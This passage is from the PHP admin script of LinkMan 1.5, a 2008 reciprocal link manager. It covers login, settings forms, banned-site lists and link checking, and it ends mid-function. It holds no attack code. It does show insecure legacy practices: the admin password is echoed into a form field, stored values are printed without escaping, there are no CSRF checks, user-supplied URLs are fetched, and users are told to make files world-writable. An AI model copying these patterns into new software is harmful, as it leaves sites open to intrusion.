<?php
/*******************************************************************************
*  Title: LinkMan reciprocal link manager
*  Version: 1.5 @ May 22, 2008
*  Author: Klemen Stirn
*  Website: http://www.phpjunkyard.com
********************************************************************************
*  COPYRIGHT NOTICE
*  Copyright 2004-2008 Klemen Stirn. All Rights Reserved.
*
*  This script may be used and modified free of charge by anyone
*  AS LONG AS COPYRIGHT NOTICES AND ALL THE COMMENTS REMAIN INTACT.
*  By using this code you agree to indemnify Klemen Stirn from any
*  liability that might arise from it's use.
*
*  Selling the code for this program, in part or full, without prior
*  written consent is expressly forbidden. Using this code, in part or full,
*  to create competing scripts or products is expressly forbidden.
*
*  Obtain permission before redistributing this software over the Internet
*  or in any other medium. In all cases copyright and header must remain
*  intact. This Copyright is in full effect in any country that has
*  International Trade Agreements with the United States of America or
*  with the European Union.
*
*  Removing any of the copyright notices without purchasing a license
*  is illegal! To remove PHPJunkyard copyright notice you must purchase a
*  license for this script. For more information on how to obtain a license
*  please visit the site below:
*  http://www.phpjunkyard.com/copyright-removal.php
*******************************************************************************/

define('IN_SCRIPT',1);
define('ADMINFILE', current(explode(".", basename(__FILE__))).'.php');
//echo ADMINFILE;

/* Get settings from the settings.php file */
require_once 'settings.php';
require_once 'config.php';

/* Make sure the update.php file is deleted for normal usage */
if (file_exists('update.php'))
{
	die('Please delete <b>update.php</b> file from your server before using LinkMan');
}

/* Start user session or output an error */
session_name('LINKMAN');
if (!session_start())
{
    error('Cannot start a new PHP session. Please contact server administrator or webmaster!');
}

/* If no action parameter is set let's force visitor to login */
if (empty($_REQUEST['action']))
{
    if (isset($_SESSION['logged']) && $_SESSION['logged'] == 'Y')
    {
        pj_session_regenerate_id();
        mainpage();
    }
    else
    {
        login();
    }
}
else
{
    $action=htmlspecialchars($_REQUEST['action']);
}

/* Do the action that is set in $action variable */
switch ($action) {
    case 'login':
        checkpassword();
        $_SESSION['logged']='Y';
        pj_session_regenerate_id();
        header('Location: '.ADMINFILE);
        exit();
    case 'saveset':
        checklogin();
        savesettings();
        break;
    case 'settings':
        checklogin();
        settings();
        break;
    case 'check':
        checklogin();
        checklinks();
        break;
    case 'remove':
        checklogin();
        removelink();
        break;
    case 'edit':
        checklogin();
        editlink();
        break;
    case 'savelink':
        checklogin();
        savelink();
        break;
    case 'add':
        checklogin();
        addlink();
        break;
    case 'logout':
        logout();
        break;
    case 'uppr':
        checklogin();
        update_pr();
        break;
    case 'banned':
        checklogin();
        banned_manage();
        break;
    case 'banned_save':
        checklogin();
        banned_save();
        break;
    default:
        login();
}
exit();


function banned_save() {
	global $settings;

    $banned = pj_input($_POST['banned']);

    $fp = @fopen($settings['banfile'],'wb') or problem('Can\'t open file '.$settings['banfile'].' for writing, on Linux CHMOD it to 666 (rw-rw-rw-)!');
    flock($fp, LOCK_EX);
    fputs($fp,$banned);
    flock($fp, LOCK_UN);
    fclose($fp);

    done('<font color="#008000"><b>Your banned websites list has been updated successfully.</b></font>');
} // End banned_save()


function banned_manage() {
	global $settings;
    printHeader();
?>
<tr>
<td class="vmes">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tr>
<td>
<p><a href="?<?php echo mt_rand(1000,9999); ?>">Main page</a> |
<a href="?action=logout">LOGOUT</a></p>
</td>
</tr>
<tr>
<td><hr></td>
</tr>
</table>

<form action="" method="post">
<p><b>Banned websites</b></p>

<p>Here is a list of websites banned from your link exchange. Banned websites
can be listed one per line, separated with a space, comma or some other character.</p>

<p><textarea name="banned" rows="30" cols="70"><?php echo file_get_contents($settings['banfile']); ?></textarea></p>

<p><input type="hidden" name="action" value="banned_save"><input type="submit" value=" Save changes "></p>

</form>

<p>&nbsp;</p>
<p align="center"><a href="<?=ADMINFILE?>">Cancel / Go back</a></p>
<p>&nbsp;</p>

</td>
</tr>
<?php
    printFooter();
    exit();
} // End banned_manage()


function settings() {
    global $settings;
    $enable_save_settings = 0;
    $file_error_present = 0;
    printHeader();
?>
<tr>
<td class="vmes">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tr>
<td>
<p><a href="?<?php echo mt_rand(1000,9999); ?>">Main page</a> |
<a href="?action=logout">LOGOUT</a></p>
</td>
</tr>
<tr>
<td><hr></td>
</tr>
</table>

<form action="" method="post">
<p><b>Configure LinkMan</b><br>
<i>(script version: <b><?php echo $settings['verzija']; ?></b>)</i></p>

<p>All fields are <b>required</b>. You will find more information about these settings
in the <a href="readme.htm" target="_blank">LinkMan Readme file</a>.</p>

<table border="0" width="90%">

<tr>
<td><i>Checking file status</i></td>
<td>&nbsp;</td>
</tr>

<tr>
<td align="left" valign="top"><b><?php echo $settings['linkfile']; ?></b></td>
<td align="left">
<?php
if (file_exists($settings['linkfile']))
{
    if (is_writable($settings['linkfile']))
    {
        echo '<font color="#008000">Exists</font>, <font color="#008000">Writable</font>';
    }
    else
    {
        $file_error_present = 1;
        echo '<font color="#008000">Exists</font>, <font color="#FF0000">Not writable</font><br />
        Please make sure PHP scripts can write to the '.$settings['linkfile'].' file.
        On Linux servers CHMOD this file to 666 (rw-rw-rw-). You will not be able
        to accept links until this issue is resolved.';
    }
}
else
{
        $file_error_present = 1;
        echo '<font color="#FF0000">Missing</font>, <font color="#FF0000">Not writable</font><br />
        Please make sure file '.$settings['linkfile'].' is located in your LinkMan
        folder and that PHP scripts can write to this file.
        On Linux servers CHMOD it to 666 (rw-rw-rw-). You will not be able
        to accept links until this issue is resolved.';
}
?>
</td>
</tr>
<tr>
<td align="left" valign="top"><b>settings.php</b></td>
<td align="left">
<?php
if (is_writable('settings.php'))
{
    $enable_save_settings = 1;
    echo '<font color="#008000">Exists</font>, <font color="#008000">Writable</font>';
}
else
{
    $file_error_present = 1;
    echo '<font color="#008000">Exists</font>, <font color="#FF0000">Not writable</font><br />
    Please make sure PHP scripts can write to the settings.php file.
    On Linux servers CHMOD this file to 666 (rw-rw-rw-). You will not be able
    to save settings until this issue is resolved.';
}
?>
</td>
</tr>
<tr>
<td align="left" valign="top"><b><?php echo $settings['banfile']; ?></b></td>
<td align="left">
<?php
if (file_exists($settings['banfile']))
{
    if (is_writable($settings['banfile']))
    {
        echo '<font color="#008000">Exists</font>, <font color="#008000">Writable</font>';
    }
    else
    {
        $file_error_present = 1;
        echo '<font color="#008000">Exists</font>, <font color="#FF0000">Not writable</font><br />
        Please make sure PHP scripts can write to the '.$settings['banfile'].' file.
        On Linux servers CHMOD this file to 666 (rw-rw-rw-). You will not be able
        to ban websites from your link exchange until this issue is resolved.';
    }
}
else
{
        $file_error_present = 1;
        echo '<font color="#FF0000">Missing</font>, <font color="#FF0000">Not writable</font><br />
        Please make sure file '.$settings['banfile'].' is located in your LinkMan
        folder and that PHP scripts can write to this file.
        On Linux servers CHMOD it to 666 (rw-rw-rw-). You will not be able
        to ban websites from your link exchange until this issue is resolved.';
}

if ($file_error_present)
{
    echo '<br /><br /><a href="?action=settings&'.mt_rand(1000,9999).'">Test files again</a>';
}
?>
</td>
</tr>

<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>


<tr>
<td><i>Available settings</i></td>
<td>&nbsp;</td>
</tr>

<tr>
<td><b>Admin password:</b></td>
<td><input type="password" name="apass" maxlength="50" size="50" value="<?php echo $settings['apass']; ?>"></td>
</tr>

<tr>
<td class="sec"><b>Website URL:</b></td>
<td class="sec"><input type="text" name="site_url" maxlength="100" size="50" value="<?php echo $settings['site_url']; ?>"></td>
</tr>

<tr>
<td><b>Website title:</b></td>
<td><input type="text" name="site_title" maxlength="100" size="50" value="<?php echo $settings['site_title']; ?>"></td>
</tr>

<tr>
<td class="sec"><b>Website description:<b></td>
<td class="sec"><input type="text" name="site_desc" maxlength="200" size="50" value="<?php echo $settings['site_desc']; ?>"></td>
</tr>

<tr>
<td><b>Show &quot;Add a link form&quot;:</b></td>
<td>
<label><input type="radio" name="show_form" value="1" style="border:none" <?php if ($settings['show_form']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="show_form" value="0" style="border:none" <?php if (!$settings['show_form']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td class="sec"><b>Notify me of new links:</b></td>
<td class="sec">
<label><input type="radio" name="notify" value="1" style="border:none" <?php if ($settings['notify']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="notify" value="0" style="border:none" <?php if (!$settings['notify']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td><b>Admin e-mail address:</b></td>
<td><input type="text" name="admin_email" maxlength="100" size="50" value="<?php echo $settings['admin_email']; ?>"></td>
</tr>

<tr>
<td class="sec"><b>Maximum links:</b></td>
<td class="sec"><input type="text" name="max_links" maxlength="5" size="5" value="<?php echo $settings['max_links']; ?>"></td>
</tr>

<tr>
<td><b>Use Security image:</b></td>
<td>
<label><input type="radio" name="autosubmit" value="1" style="border:none" <?php if ($settings['autosubmit']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="autosubmit" value="0" style="border:none" <?php if (!$settings['autosubmit']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td class="sec"><b>Enable SPAM filter:</b></td>
<td class="sec">
<label><input type="radio" name="spam_filter" value="1" style="border:none" <?php if ($settings['spam_filter']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="spam_filter" value="0" style="border:none" <?php if (!$settings['spam_filter']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td><b>Block superlatives:</b></td>
<td>
<label><input type="radio" name="superlatives" value="1" style="border:none" <?php if ($settings['superlatives']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="superlatives" value="0" style="border:none" <?php if (!$settings['superlatives']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td class="sec" valign="top"><b>Normal links or redirects:</b></td>
<td class="sec">
<label><input type="radio" name="clean" value="0" style="border:none" <?php if ($settings['clean']==0) {echo 'checked';} ?>> Use normal links</label><br>
<label><input type="radio" name="clean" value="1" style="border:none" <?php if ($settings['clean']==1) {echo 'checked';} ?>> Redirect all links</label><br>
<label><input type="radio" name="clean" value="2" style="border:none" <?php if ($settings['clean']==2) {echo 'checked';} ?>> Featured normal, reciprocal redirect</label>
</td>
</tr>

<tr>
<td valign="top"><b>Add <i>rel=&quot;nofollow&quot;</i> to links:</b></td>
<td>
<label><input type="radio" name="use_nofollow" value="0" style="border:none" <?php if (!$settings['use_nofollow']) {echo 'checked';} ?>> NO</label><br>
<label><input type="radio" name="use_nofollow" value="1" style="border:none" <?php if ($settings['use_nofollow']==1) {echo 'checked';} ?>> YES, to all links</label><br>
<label><input type="radio" name="use_nofollow" value="2" style="border:none" <?php if ($settings['use_nofollow']==2) {echo 'checked';} ?>> YES, but not to Featured links</label>
</td>
</tr>

<tr>
<td class="sec" valign="top"><b>Add new links to:</b></td>
<td class="sec">
<label><input type="radio" name="add_to" value="1" style="border:none" <?php if ($settings['add_to']) {echo 'checked';} ?>> Bottom of list</label>
<label><input type="radio" name="add_to" value="0" style="border:none" <?php if (!$settings['add_to']) {echo 'checked';} ?>> Top of list</label>
</td>
</tr>

<tr>
<td><b>File with link data:</b></td>
<td><input type="text" name="linkfile" maxlength="100" size="50" value="<?php echo $settings['linkfile']; ?>"></td>
</tr>

<tr>
<td class="sec"><b>File with banned websites:</b></td>
<td class="sec"><input type="text" name="banfile" maxlength="100" size="50" value="<?php echo $settings['banfile']; ?>"></td>
</tr>

<tr>
<td><b>Show URL after title:</b></td>
<td>
<label><input type="radio" name="show_url" value="1" style="border:none" <?php if ($settings['show_url']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="show_url" value="0" style="border:none" <?php if (!$settings['show_url']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td class="sec" valign="top"><b>Show Google PageRank<sup>TM</sup>:</b></td>
<td class="sec">
<label><input type="radio" name="show_pr" value="0" style="border:none" <?php if (!$settings['show_pr']) {echo 'checked';} ?>> NO</label><br>
<label><input type="radio" name="show_pr" value="1" style="border:none" <?php if ($settings['show_pr']==1) {echo 'checked';} ?>> YES</label><br>
<label><input type="radio" name="show_pr" value="2" style="border:none" <?php if ($settings['show_pr']==2) {echo 'checked';} ?>> In admin panel only</label>
</td>
</tr>

<tr>
<td><b>Minimum PR to accept website:</b></td>
<td><select name="min_pr">
<?php
for ($i=0;$i<=10;$i++)
{
    if ($i == $settings['min_pr'])
    {
        echo '<option value="'.$i.'" selected>'.$i.'</option>';
    }
    else
    {
        echo '<option value="'.$i.'">'.$i.'</option>';
    }
}
?>
</select></td>
</tr>

<tr>
<td class="sec"><b>Minimum reciprocal URL PR:</b></td>
<td class="sec"><select name="min_pr_rec">
<?php
for ($i=0; $i<=10; $i++)
{
    if ($i == $settings['min_pr_rec'])
    {
        echo '<option value="'.$i.'" selected>'.$i.'</option>';
    }
    else
    {
        echo '<option value="'.$i.'">'.$i.'</option>';
    }
}
?>
</select></td>
</tr>

<tr>
<td><b>Block links with <i>rel=&quot;nofollow&quot;</i>:</b></td>
<td>
<label><input type="radio" name="block_nofollow" value="1" style="border:none" <?php if ($settings['block_nofollow']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="block_nofollow" value="0" style="border:none" <?php if (!$settings['block_nofollow']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td class="sec"><nobr><b>Block noindex, nofollow pages:</b></nobr></td>
<td class="sec">
<label><input type="radio" name="block_meta_rob" value="1" style="border:none" <?php if ($settings['block_meta_rob']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="block_meta_rob" value="0" style="border:none" <?php if (!$settings['block_meta_rob']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td><b>Block duplicate links:</b></td>
<td>
<label><input type="radio" name="block_duplicates" value="1" style="border:none" <?php if ($settings['block_duplicates']) {echo 'checked';} ?>> YES</label>
<label><input type="radio" name="block_duplicates" value="0" style="border:none" <?php if (!$settings['block_duplicates']) {echo 'checked';} ?>> NO</label>
</td>
</tr>

<tr>
<td class="sec" valign="top"><b>Show thumbshots:</b></td>
<td class="sec">
<label><input type="radio" name="show_thumbshots" value="0" style="border:none" <?php if (!$settings['show_thumbshots']) {echo 'checked';} ?>> NO</label><br>
<label><input type="radio" name="show_thumbshots" value="1" style="border:none" <?php if ($settings['show_thumbshots']==1) {echo 'checked';} ?>> YES, for all links</label><br>
<label><input type="radio" name="show_thumbshots" value="2" style="border:none" <?php if ($settings['show_thumbshots']==2) {echo 'checked';} ?>> YES, for Featured links only</label>
</td>
</tr>

<tr>
<td><b>Thumbshots service URL:</b></td>
<td><input type="text" name="thumb_url" maxlength="200" size="50" value="<?php echo $settings['thumb_url']; ?>"></td>
</tr>

<tr>
<td class="sec" valign="top"><b>Hide these sections on load:</b></td>
<td class="sec">
<label><input type="checkbox" name="divLinks" value="1" style="border:none" <?php if (in_array('divLinks',$settings['hide'])) {echo 'checked';} ?>> Existing links</label><br>
<label><input type="checkbox" name="divCheck" value="1" style="border:none" <?php if (in_array('divCheck',$settings['hide'])) {echo 'checked';} ?>> Check reciprocal links</label><br>
<label><input type="checkbox" name="divAdd" value="1" style="border:none" <?php if (in_array('divAdd',$settings['hide'])) {echo 'checked';} ?>> Add a link</label><br>
<label><input type="checkbox" name="divRate" value="1" style="border:none" <?php if (in_array('divRate',$settings['hide'])) {echo 'checked';} ?>> Rate this script</label><br>
<label><input type="checkbox" name="divUpdate" value="1" style="border:none" <?php if (in_array('divUpdate',$settings['hide'])) {echo 'checked';} ?>> Stay updated</label><br>
</td>
</tr>

<tr>
<td><b>Debug mode:</b></td>
<td>
<label><input type="radio" name="debug" value="0" style="border:none" <?php if (!$settings['debug']) {echo 'checked';} ?>> OFF</label>
<label><input type="radio" name="debug" value="1" style="border:none" <?php if ($settings['debug']) {echo 'checked';} ?>> ON</label>
</td>
</tr>

</table>

<p><input type="hidden" name="action" value="saveset"><input type="submit" value=" Save changes "
<?php
if ($enable_save_settings != 1)
{
    echo 'disabled';
}
?> ></p>


</form>

<p>&nbsp;</p>
<p align="center"><a href="<?=ADMINFILE?>">Cancel / Go back</a></p>
<p>&nbsp;</p>

</td>
</tr>
<?php
    printFooter();
    exit();
} // END settings()


function update_pr() {
    global $settings;
    require('pagerank.php');

    $lines=file($settings['linkfile']);
    $i=1;
    $rewrite=0;

    echo '
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset='.$settings['charset'].'">
    <link rel="STYLESHEET" type="text/css" href="style.css">
    <title>Updating Google PageRank...</title>
    </head>
    <body>
    ';

    foreach($lines as $thisline)
    {
        list($name,$email,$title,$url,$recurl,$description,$featured,$old_pr)=explode($settings['delimiter'],$thisline);
        $description = trim($description);
        $featured = empty($featured) ? 0 : 1;
        $old_pr   = trim($old_pr);
        $old_pr   = empty($old_pr) ? 0 : $old_pr;
        $new_pr   = getpr($url);
        $new_pr   = empty($new_pr) ? 0 : $new_pr;

        if ($new_pr != $old_pr)
        {
            $rewrite = 1;
            $j = $i-1;
            $lines[$j] = "$name$settings[delimiter]$email$settings[delimiter]$title$settings[delimiter]$url$settings[delimiter]$recurl$settings[delimiter]$description$settings[delimiter]$featured$settings[delimiter]$new_pr\r\n";
        }

        echo '<p>Updating link N. <b>'.$i.'</b>...<br>';
        echo '-&gt; Link URL: '.$url.'<br>';
        echo '-&gt; Old PageRank: '.$old_pr.'/10<br>';
        echo '-&gt; New PageRank: '.$new_pr.'/10<br>';

        $i++;
        flush();
    }

    if ($rewrite == 1)
    {
        $lines = implode('',$lines);
        $fp = fopen($settings['linkfile'],'wb') or problem('Couldn\'t open links file for writing! Please CHMOD all txt files to 666 (rw-rw-rw)!');
        flock($fp, LOCK_EX);
        fputs($fp,$lines);
        flock($fp, LOCK_UN);
        fclose($fp);
        echo '<p>UPDATING LINKINFO FILE</p>';
    }
    else
    {
        echo '<p>NOTHING TO UPDATE</p>';
    }

    echo '
    <p>&nbsp;</p>
    <p><b>DONE!</b></p>
    <p><a href="'.ADMINFILE.'">Back to main page</a></p>
    </body>
    </html>
    ';

    exit();
} // END update_pr()


function checklinks() {
    global $settings;
    $lines   = file($settings['linkfile']);
    $site_url = strtolower($settings['site_url']);
    //ini_set('user_agent', 'LinkMan '.$settings['verzija'].' by http://www.phpjunkyard.com');

    $i = 1;
    $rewrite = 0;
    $found   = 0;

    echo '
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset='.$settings['charset'].'">
    <link rel="STYLESHEET" type="text/css" href="style.css">
    <title>Checking reciprocal links...</title>
    </head>
    <body>
    ';

    foreach($lines as $thisline) {
        list($name,$email,$title,$url,$recurl,$description,$featured,$pr)=explode($settings['delimiter'],$thisline);

        echo '<p>Checking link N. <b>'.$i.'</b>...<br>';
        echo '-&gt; Link URL: <a href="'.$url.'" target="_blank">'.$url.'</a><br>';
        if ($recurl == 'http://nolink')
        {
            echo '<font color="#008000">No reciprocal link required!</font><br><br>';
            echo '- - - - - - - - - - - - - - - - - - - - - - - - - - - -</p>';
            $i++;
            flush();
            continue;
        }
        else
        {
            echo '-&gt; Reciprocal URL: <a href="'.$recurl.'" target="_blank">'.$recurl.'</a><br>';
        }
        echo '-&gt; Opening and reading reciprocal URL ';

        $html = @file_get_contents($recurl) or $html='NO';

        if ($html == 'NO')
        {
            if (empty($_POST['docantopen']))
            {
                echo '<br><font color="#FF6600">CAN\'T OPEN RECIPROCAL URL!</font><br><br>Owner (click on name for e-mail): <a href="mailto:'.$email.'">'.$name.'</a><br>';
            }
            else
            {
                echo '<br><font color="#FF0000">CAN\'T OPEN RECIPROCAL URL!</font><br><br>Removing link ...<br>';
                unset($lines[$i-1]);
                $rewrite=1;
            }
        }
        else
        {
            $html=strtolower($html);

            if (preg_match_all('/<a\s[^>]*href=([\"\']??)([^" >]*?)\\1([^>]*)>/siU', $html, $matches, PREG_SET_ORDER)) {
                foreach($matches as $match) {
                    if ($match[2] == $settings['site_url'] || $match[2] == $settings['site_url'].'/') {
                        $found = 1;
                        break;
                    }
                }
            }

            if ($found)
            {
                echo '<br><font color="#008000">A link to '.$settings['site_url'].' was found!</font><br><br>';
            }
            elseif (empty($_POST['dowhat']))
            {
                echo '<br><font color="#FF0000">LINK NOT FOUND!</font><br><br>Owner (click on name for e-mail): <a href="mailto:'.$email.'">'.$name.'</a><br>';
            }
            else
            {
                echo '<br><font color="#FF0000">LINK NOT FOUND!</font><br><br>Removing link ...<br>';
                unset($lines[$i-1]);
                $rewrite=1;
            }

            $found    = 0;
        }
        $i++;
        echo '- - - - - - - - - - - - - - - - - - - - - - - - - - - -</p>';
        flush();
    }

    if ($rewrite == 1)
    {
        $lines = implode('',$lines);
        $fp = fopen($settings['linkfile'],'wb') or problem('Couldn\'t open links file for writing! Please CHMOD all txt files to 666 (rw-rw-rw)!');
        flock($fp, LOCK_EX);
        fputs($fp,$lines);
        flock($fp, LOCK_UN);
        fclose($fp);
        echo '<p>UPDATING LINKINFO FILE</p>';
    }
    else
    {
        echo '<p>NOTHING TO UPDATE</p>';
    }

    echo '
    <p>&nbsp;</p>
    <p><b>DONE!</b></p>
    <p><a href="'.ADMINFILE.'">Back to main page</a></p>
    </body>
    </html>
    ';

exit();
}
// END checklinks()


function savelink() {
    global $settings;

    $id    = pj_isNumber($_POST['id'],'Invalid link ID number!');
    $name  = pj_input($_POST['name']) or $name = 'unknown';
    $email = pj_input($_POST['email']) or $email = 'unknown@unknown.com';
    if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/",$email))
    {
        problem('Please enter a valid e-mail address!');
    }
    $title = pj_input($_POST['title'],'Please enter the title (name) of the website!');

    $url   = pj_input($_POST['url'],'Please enter the URL of the website!');
    if (!(preg_match("/(http:\/\/+[\w\-]+\.[\w\-]+)/i",$url)))
    {
        problem('Please enter valid URL of the website!');
    }

    if (empty($_POST['norecurl']))
    {
	    $recurl = pj_input($_POST['recurl'], 'Please enter the url where a reciprocal link to your site is placed!');
	    if ($recurl != 'http://nolink' && !(preg_match("/(http:\/\/+[\w\-]+\.[\w\-]+)/i",$recurl)))
	    {
	        problem('Please enter valid URL of the page where the reciprocal link to your site is placed!');
	    }
    }
    else
    {
    	$recurl = 'http://nolink';
    }

    $url    = str_replace('&amp;','&',$url);
    $recurl = str_replace('&amp;','&',$recurl);

    $description = pj_input($_POST['description'],'Please write a short description of your website!');
    if (strlen($description)>200)
    {
        problem('Description is too long! Description of your website is limited to 200 chars!');
    }

    $featured = $_POST['featured'] ? 1 : 0;

    if ($settings['show_pr'])
    {
        require('pagerank.php');
        $pr = getpr($url);
    }
    $pr = empty($pr) ? 0 : $pr;

    $replacement = "$name$settings[delimiter]$email$settings[delimiter]$title$settings[delimiter]$url$settings[delimiter]$recurl$settings[delimiter]$description$settings[delimiter]$featured$settings[delimiter]$pr\r\n";

    $lines = @file($settings['linkfile']);
    if ($featured)
    {
        unset($lines[$id]);
        array_splice($lines, 0, 0, $replacement);
    }
    else
    {
        /* If previously featured move below any other featured now */
        $next_id = $id + 1;
        if (isset($lines[$next_id]))
        {
            list($name,$email,$title,$url,$recurl,$description,$featured,$pr)=explode($settings['delimiter'],$lines[$next_id]);
            if ($featured)
            {
                unset($lines[$id]);
                $lines[] = $replacement;
            }
            else
            {
                $lines[$id] = $replacement;
            }
        }
        else
        {
            $lines[$id] = $replacement;
        }
    }

    $fp = fopen($settings['linkfile'],'wb') or problem('Couldn\'t open links file for writing! Please CHMOD all txt files to 666 (rw-rw-rw)!');
    flock($fp, LOCK_EX);
    fputs($fp,implode('',$lines));
    flock($fp, LOCK_UN);
    fclose($fp);

    done('<font color="#008000"><b>Your changes have been saved successfully.</b></font>');
} // END savelink()


function editlink() {
    global $settings;
    $id = pj_isNumber($_GET['id'],'Invalid link ID number!');
    $lines = file($settings['linkfile']);
    list($name,$email,$title,$url,$recurl,$description,$featured,$pr)=explode($settings['delimiter'],$lines[$id]);

    if ($name == 'unknown')
    {
    	$name = '';
    }
    if ($email == 'unknown@unknown.com')
    {
    	$email = '';
    }

    printHeader();
?>
<tr>
<td class="vmes">

<form action="" method="post" name="addlinkform" onSubmit="return checkRequiredFields();">
<p><b>Edit link</b></p>

<p>Use this form edit websites in your link exchange. LinkMan <b>will NOT</b> check for reciprocal links when you submit using this form!</p>

<table border="0">
<tr>
<td><b>Webmaster name:</b></td>
<td><input type="text" name="name" maxlength="50" size="50" value="<?php echo $name; ?>"></td>
</tr>
<tr>
<td><b>Webmaster e-mail:</b></td>
<td><input type="text" name="email" maxlength="50" size="50" value="<?php echo $email; ?>"></td>
</tr>
<tr>
<td><b>Website title:</b></td>
<td><input type="text" name="title" maxlength="50" size="50" value="<?php echo $title; ?>"></td>
</tr>
<tr>
<td><b>Website URL:<b></td>
<td><input type="text" name="url" maxlength="100" size="50" value="<?php echo $url; ?>"></td>
</tr>
<tr>
<td valign="top"><b>URL with reciprocal link:</b></td>
<td><input type="text" name="recurl" maxlength="100" size="50" value="<?php echo $recurl; ?>" <?php if ($recurl == 'http://nolink') {echo 'disabled';} ?>><br>
<label><input type="checkbox" name="norecurl" value="1" onClick="javascript:toggleRECURL();" style="border:none" <?php if ($recurl == 'http://nolink') {echo 'checked';} ?>> No reciprocal link required</label></td>
</tr>
<tr>
<td><b>Featured link:</b><sup>1</sup></td>
<td><label><input type="radio" name="featured" value="0" style="border:none" <?php if (!$featured) {echo 'checked';} ?>> NO</label> |
<label><input type="radio" name="featured" value="1" style="border:none" <?php if ($featured) {echo 'checked';} ?>> YES</label></td>
</tr>
</table>

<p><b>Website description:</b><br>
<input type="text" name="description" maxlength="200" size="70" value="<?php echo $description; ?>"></p>

<p><input type="hidden" name="action" value="savelink"><input type="hidden" name="id" value="<?php echo $id; ?>"><input type="submit" value=" Save changes "></p>

<table border="0">
<tr>
<td valign="top"><sup>1</sup></td>
<td>Featured links will be displayed on top of the links page and made more visible than
other links.</td>
</tr>
</table>

</form>

<p>&nbsp;</p>
<p align="center"><a href="<?=ADMINFILE?>">Cancel / Go back</a></p>
<p>&nbsp;</p>

</td>
</tr>
<?php
    printFooter();
    exit();
} // END editlink()


function removelink() {
    global $settings;

    $id = pj_isNumber($_GET['id'],'Invalid link ID number!');
    $lines = file($settings['linkfile']);
    unset($lines[$id]);
    $lines = implode('',$lines);

    $fp = fopen($settings['linkfile'],'wb') or problem('Can\'t write to linkinfo file! Please check the file permissions (CHMOD it to 666 on UNIX machines)');
    flock($fp, LOCK_EX);
    fputs($fp,$lines);
    flock($fp, LOCK_UN);
    fclose($fp);

    done('<font color="#008000"><b>The selected link was successfully removed!</b></font>');
} // END removelink()


function addlink() {
    global $settings;

    $name  = pj_input($_POST['name']) or $name = 'unknown';
    $email = pj_input($_POST['email']) or $email = 'unknown@unknown.com';
    if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/",$email))
    {
        problem('Please enter a valid e-mail address!');
    }
    $title = pj_input($_POST['title'],'Please enter the title (name) of the website!');

    $url   = pj_input($_POST['url'],'Please enter the URL of the website!');
    if (!(preg_match("/(http:\/\/+[\w\-]+\.[\w\-]+)/i",$url)))
    {
        problem('Please enter valid URL of the website!');
    }

    if (empty($_POST['norecurl']))
    {
	    $recurl = pj_input($_POST['recurl'], 'Please enter the url where a reciprocal link to your site is placed!');
	    if ($recurl != 'http://nolink' && !(preg_match("/(http:\/\/+[\w\-]+\.[\w\-]+)/i",$recurl)))
	    {
	        problem('Please enter valid URL of the page where the reciprocal link to your site is placed!');
	    }
    }
    else
    {
    	$recurl = 'http://nolink';
    }

    $url    = str_replace('&amp;','&',$url);
    $recurl = str_replace('&amp;','&',$recurl);

    $description = pj_input($_POST['description'],'Please write a short description of your website!');
    if (strlen($description)>200)
    {
        problem('Description is too long! Description of your website is limited to 200 chars!');
    }

    $lines=@file($settings['linkfile']);
    if (count($lines)>$settings['max_links'])
    {
        problem('You have reached your maximum links limit!');
    }

    $featured = $_POST['featured'] ? 1 : 0;

    if ($settings['show_pr'])
    {
        require('pagerank.php');
        $pr = getpr($url);
    }
    $pr = empty($pr) ? 0 : $pr;

    $replacement = "$name$settings[delimiter]$email$settings[delimiter]$title$settings[delimiter]$url$settings[delimiter]$recurl$settings[delimiter]$description$settings[delimiter]$featured$settings[delimiter]$pr\r\n";

    if ($featured == 1) /* Featured links are added to the top */
    {
        $replacement .= implode('',$lines);
        $fp = fopen($settings['linkfile'],'wb') or problem('Couldn\'t open links file for writing! Please CHMOD all txt files to 666 (rw-rw-rw)!');
        flock($fp, LOCK_EX);
        fputs($fp,$replacement);
        flock($fp, LOCK_UN);
        fclose($fp);
    }
    elseif ($settings['add_to'] == 0) /* Add to top but BELOW any featured links */
    {
        $i = 0;
        foreach ($lines as $thisline)
        {
        	list($name2,$email2,$title2,$url2,$recurl2,$description2,$featured2,$pr2)=explode($settings['delimiter'],$thisline);
	        $featured2 = $featured2 ? 1 : 0;
            if ($featured2 == 0)
            {
				$lines[$i] = $replacement . $thisline;
                break;
            }
            $i++;
        }

        $replacement = implode('',$lines);
        $fp = fopen($settings['linkfile'],'wb') or problem('Couldn\'t open links file for writing! Please CHMOD all txt files to 666 (rw-rw-rw)!');
        flock($fp, LOCK_EX);
        fputs($fp,$replacement);
        flock($fp, LOCK_UN);
        fclose($fp);
    }
    else /* Add to the bottom */
    {
        $fp = fopen($settings['linkfile'],'ab') or problem('Couldn\'t open links file for appending! Please CHMOD all txt files to 666 (rw-rw-rw)!');
        flock($fp, LOCK_EX);
        fputs($fp,$replacement);
        flock($fp, LOCK_UN);
        fclose($fp);
    }

    done('<font color="#008000"><b>The URL '.$url.' was successfully added to your links page</b></font>');
} // END addlink()


function done($message) {
global $settings;
printHeader();
?>
<tr>
<td class="vmes"><p>&nbsp;</p>
<div align="center"><center>
<table width="400"> <tr>
<td align="center" class="head">&nbsp;</td>
</tr>
